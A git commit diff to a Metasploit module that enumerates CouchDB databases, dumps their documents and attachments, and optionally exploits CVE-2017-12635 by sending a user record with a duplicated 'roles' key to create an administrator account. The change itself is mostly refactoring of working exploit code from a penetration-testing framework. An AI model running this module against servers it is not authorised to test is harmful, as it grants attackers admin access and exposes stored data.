3a726554e9b084acc5a3e12bc4497f41fc58c0fb
William Vu <William_Vu@rapid7.com>
2019-01-07 11:18:19 -0600

    Fix review comments

--- modules/auxiliary/scanner/couchdb/couchdb_enum.rb
+++ modules/auxiliary/scanner/couchdb/couchdb_enum.rb
@@ -9,34 +9,35 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'CouchDB Enum Utility',
-      'Description'    => %q{
+      'Name'        => 'CouchDB Enum Utility',
+      'Description' => %q{
         This module enumerates databases on CouchDB using the REST API
         (without authentication by default).
       },
-      'References'     =>
+      'References'  =>
         [
-          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API'],
-          ['CVE','2017-12635'],
-          ['URL','https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635'],
-          ['URL','https://justi.cz/security/2017/11/14/couchdb-rce-npm.html']
+          ['CVE', '2017-12635'],
+          ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],
+          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API']
         ],
-      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
-                            'Hendrik Van Belleghem - @hendrikvb', # Database dump enhancements
-                            'Green-m <greenm.xxoo[at]gmail.com>' # Portions from apache_couchdb_cmd_exec.rb used
-                          ],
-      'License'        => MSF_LICENSE
+      'Author'      =>
+        [
+          'Max Justicz', # Vulnerability discovery
+          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit module
+          'Hendrik Van Belleghem', # (@hendrikvb) Database dump enhancements
+          'Green-m <greenm.xxoo[at]gmail.com>' # Portions from apache_couchdb_cmd_exec.rb used
+        ],
+      'License'     => MSF_LICENSE
     ))
 
     register_options(
       [
+        Opt::RPORT(5984),
         OptString.new('TARGETURI', [true, 'Path to list all the databases', '/_all_dbs']),
-        OptBool.new('SERVERINFO', [true, 'Print server info']),
-        OptBool.new('CREATEUSER', [true, 'Create Administrative user - ']),
-        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12,"")]),
-        OptString.new('HttpPassword', [true, 'CouchDB Password', 'password']),
-        OptString.new('RPORT', [true, 'CouchDB Port', '5984']),
-        OptString.new('RHOST', [true, 'CouchDB Host', '']),
+        OptBool.new('SERVERINFO', [true, 'Print server info', false]),
+        OptBool.new('CREATEUSER', [true, 'Create Administrative user', false]),
+        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12)]),
+        OptString.new('HttpPassword', [true, 'CouchDB Password', Rex::Text.rand_text_alpha(12)]),
         OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])
 
       ])
@@ -51,9 +52,8 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-        'uri'           => normalize_uri("/"),
-        'method'        => 'GET',
-        'authorization' => @auth
+        'uri'    => '/',
+        'method' => 'GET'
       )
     rescue Rex::ConnectionError
       vprint_bad("#{peer} - Connection failed")
@@ -61,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless res
-      vprint_bad("#{peer} - No response, check if it is CouchDB. ")
+      vprint_bad("#{peer} - No response, check if it is CouchDB.")
       return false
     end
 
@@ -83,149 +83,145 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_warning("#{peer} - Version not found")
-    return true
+    true
   end
 
   def check
-    get_version
+    return Exploit::CheckCode::Unknown unless get_version
     version = Gem::Version.new(@version)
-    return CheckCode::Unknown if version.version.empty?
-    vprint_status "Found CouchDB version #{version}"
+    return Exploit::CheckCode::Unknown if version.version.empty?
+    vprint_good("#{peer} - Found CouchDB version #{version}")
 
-    return CheckCode::Appears if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
+    return Exploit::CheckCode::Appears if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
 
-    CheckCode::Safe
+    Exploit::CheckCode::Safe
   end
 
   def get_dbs(auth)
     begin
       res = send_request_cgi(
-        'uri'           => normalize_uri(target_uri.path),
-        'method'        => 'GET'#,
-        #'authorization' => auth
+        'uri'    => normalize_uri(target_uri.path),
+        'method' => 'GET'
       )
 
       temp = JSON.parse(res.body)
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
-      print_error("#{peer} The following Error was encountered: #{e.class}")
+      print_error("#{peer} - The following Error was encountered: #{e.class}")
       return
     end
 
-    if valid_response(res)
-      print_status("#{peer} Enumerating Databases...")
-      results = JSON.pretty_generate(temp)
-      print_good("#{peer} Databases:\n\n#{results}\n")
-       path = store_loot(
-        'couchdb.enum',
-        'application/json',
-        rhost,
-        results,
-        'CouchDB Databases'
-      )
+    unless valid_response(res)
+      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
+      return
+    end
 
-      print_good("#{peer} File saved in: #{path}")
-      res.get_json_document.each do |db|
-        res = send_request_cgi(
-          'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs?include_docs=true&attachments=true"),
-          'method'=> 'GET',
-          'authorization' => auth
-         )
-         if res.code != 200
-           print_bad("Error retrieving database. Consider providing credentials.")
-           return
-         end
-         temp = JSON.parse(res.body)
-         results = JSON.pretty_generate(temp)
-         path = store_loot(
-           "couchdb.#{db}",
-           "application/json",
-           rhost,
-           results,
-           "CouchDB Databases"
-         )
-         print_good("#{peer} #{db} saved in: #{path}")
-      end
-    else
-       print_error("#{peer} Unable to enum, received \"#{res.code}\"")
+    print_status("#{peer} - Enumerating Databases...")
+    results = JSON.pretty_generate(temp)
+    print_good("#{peer} - Databases:\n\n#{results}\n")
+     path = store_loot(
+      'couchdb.enum',
+      'application/json',
+      rhost,
+      results,
+      'CouchDB Databases'
+    )
+
+    print_good("#{peer} - File saved in: #{path}")
+    res.get_json_document.each do |db|
+      r = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs"),
+        'method'=> 'GET',
+        'authorization' => auth,
+        'vars_get' => {'include_docs' => 'true', 'attachments' => 'true'}
+       )
+       if r.code != 200
+         print_bad("#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
+         return
+       end
+       temp = JSON.parse(r.body)
+       results = JSON.pretty_generate(temp)
+       path = store_loot(
+         "couchdb.#{db}",
+         "application/json",
+         rhost,
+         results,
+         "CouchDB Databases"
+       )
+       print_good("#{peer} - #{db} saved in: #{path}")
     end
   end
 
   def get_server_info(auth)
     begin
       res = send_request_cgi(
-        'uri'           => '/',
-        'method'        => 'GET',
-        'authorization' => auth
+        'uri'    => '/',
+        'method' => 'GET'
       )
 
       temp = JSON.parse(res.body)
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
-      print_error("#{peer} The following Error was encountered: #{e.class}")
+      print_error("#{peer} - The following Error was encountered: #{e.class}")
       return
     end
 
-    if valid_response(res)
-      # Example response: {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
-
-      print_good("#{peer} #{JSON.pretty_generate(temp)}")
-      report_service(
-        host: rhost,
-        port: rport,
-        name: 'couchdb',
-        proto: 'tcp',
-        info: res.body
-      )
-    else
-      print_error("#{peer} Unable to enum, received \"#{res.code}\"")
+    unless valid_response(res)
+      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
+      return
     end
+
+    # Example response: {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
+
+    print_good("#{peer} - #{JSON.pretty_generate(temp)}")
+    report_service(
+      host: rhost,
+      port: rport,
+      name: 'couchdb',
+      proto: 'tcp',
+      info: res.body
+    )
   end
 
   def create_user
     username = datastore['HttpUsername']
     password = datastore['HttpPassword']
-    rport = datastore['RPORT']
-    rhost = datastore['RHOST']
     roles = datastore['ROLES']
     timeout = datastore['TIMEOUT']
-    uripath = datastore['URIPATH']
     version = @version
 
-    data = "{
-\"type\": \"user\",
-\"name\": \"#{username}\",
-\"roles\": [\"#{roles}\"],
-\"roles\": [],
-\"password\": \"#{password}\"
-}"
+    data = %Q({
+"type": "user",
+"name": "#{username}",
+"roles": ["#{roles}"],
+"roles": [],
+"password": "#{password}"
+})
     res = send_request_cgi(
-    { 'uri'    => "http://#{rhost}:#{rport}/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
+    { 'uri'    => "/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
       'method' => 'PUT',
       'ctype'  => 'text/json',
       'data'   => data,
     }, timeout)
 
-    if res && res.code == 200
-      print_good("User #{username} created with password #{password}. Connect to http://#{rhost}:#{rport}/_utils/ to login.")
-    else
-      print_error("Change Failed :(")
+    unless res && res.code == 200
+      print_error("#{peer} - Change Failed")
+      return
     end
+
+    print_good("#{peer} - User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.")
   end
 
   def run
     username = datastore['HttpUsername']
     password = datastore['HttpPassword']
 
-    auth = basic_auth(username, password) if username && password
-    if datastore['SERVERINFO']
-      get_server_info(auth)
-    end
     if datastore['CREATEUSER']
-      get_version
+      fail_with(Failure::Unknown, 'get_version failed in run') unless get_version
       version = Gem::Version.new(@version)
-      print_good "Found CouchDB version #{version}"
+      print_good("#{peer} - Found CouchDB version #{version}")
       create_user if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
     end
+    auth = basic_auth(username, password) if username && password
+    get_server_info(auth) if datastore['SERVERINFO']
     get_dbs(auth)
   end
-
 end
